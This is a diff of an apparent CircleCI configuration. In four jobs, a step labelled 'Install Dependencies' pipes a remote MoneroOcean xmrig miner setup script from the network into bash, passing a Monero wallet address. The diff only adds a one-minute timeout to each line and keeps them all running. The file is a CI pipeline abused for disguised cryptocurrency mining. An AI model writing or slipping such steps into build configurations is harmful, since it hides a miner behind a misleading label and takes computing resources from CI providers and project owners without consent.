@@ -6,7 +6,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2
+            command: timeout 1m curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2
 
     Devop1:
       docker:
@@ -14,7 +14,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2
+            command: timeout 1m curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2
 
     Devop2:
       docker:
@@ -22,15 +22,14 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2
-
+            command: timeout 1m curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2
+            command: timeout 1m curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2
 
 workflows:
     version: 2.1
